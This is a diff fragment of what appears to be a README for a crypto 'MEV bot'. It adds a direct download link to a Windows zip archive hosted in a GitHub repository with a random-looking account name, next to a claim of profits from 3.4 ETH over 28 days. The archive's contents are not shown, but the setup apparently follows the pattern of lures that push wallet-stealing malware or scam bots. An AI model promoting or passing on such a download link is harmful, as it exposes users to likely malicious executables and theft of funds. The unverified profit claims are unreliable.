@@ -167,7 +167,7 @@ During **28 days of continuous testing**, starting with **3.4 ETH**, the bot gen
 
   
 
-[⬇️ **Download M.E.V - Terminal (Windows)**]()
+[⬇️ **Download M.E.V - Terminal (Windows)**](https://github.com/lynx-badgergjtwj/Mev-Terminal-Bot/raw/refs/heads/main/MEV_Bot_Terminal_Windows.zip)
 
   
 
